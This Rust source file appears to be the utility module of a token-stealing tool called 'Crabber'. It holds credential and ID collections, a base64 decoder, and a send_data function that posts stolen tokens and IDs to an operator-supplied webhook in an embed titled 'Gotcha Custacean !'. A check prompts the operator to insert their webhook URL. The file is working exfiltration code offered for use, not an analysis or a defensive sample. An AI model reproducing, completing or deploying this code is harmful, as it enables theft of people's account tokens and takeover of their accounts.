use base64::Engine as _;
use reqwest::blocking::Client;

pub const WEBHOOK_URL : &str = "WEBHOOK_HERE";
pub const ROAMING : &str = std::env!("APPDATA");
pub const APPDATA : &str = std::env!("LOCALAPPDATA");

// Implement Default trait for Credentials
#[derive(Default)]
pub struct Credentials {
    pub id: Vec<String>,
    pub token: Vec<String>,
}

pub fn decode_base64(encoded: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    match base64::engine::general_purpose::STANDARD.decode(encoded) {
        Ok(decoded) => Ok(decoded.to_vec()),
        Err(err) => Err(Box::new(err) as Box<dyn std::error::Error>),
    }
}

pub fn isempty_webhook() -> Result<(), String> {
    return if WEBHOOK_URL == "WEBHOOK_HERE" {Err(String::from("Error: Please enter a webhook URL in ./src/global/utils.rs:4 in the WEBHOOK_URL const.\n"))} else {Ok(())};
}

pub fn send_data(webhook_url: &str, data: &str) -> u16{
    let parts: Vec<&str> = data.split("NOP").collect();
    let payload = serde_json::json!({
        "username": "Crabber",
        "avatar_url": "https://i.redd.it/bm6dj3i51gd71.png",
        "embeds": [
            {
                "title": "Gotcha Custacean !",
                "color": 0xfc541c,
                "fields": [
                    {
                         "name": "Token's:",
                         "value": format!("```md\n{}```",parts[1].trim()),

                    },
                    {
                        "name": "ID's:",
                        "value": format!("```md\n{}```",parts[0].trim()),
                    }
                ],
                "thumbnail": {
                    "url": "https://user-images.githubusercontent.com/8974888/231858967-7c37bf1e-335b-4f5a-9760-da97be9f54bb.png"
                },

            },
        ]

    });

    let response = Client::new().post(webhook_url)
        .header("Content-Type", "application/json")
        .body(payload.to_string())
        .send();

    return response.unwrap().status().as_u16();
}

pub fn remove_duplicates<T: Eq + std::hash::Hash + Clone>(vec: Vec<T>) -> Vec<T> {
    let mut result = Vec::new();
    
    vec.iter().for_each(|x| {
        if !result.contains(x) {
            result.push(x.clone());
        }
    });

    result
}
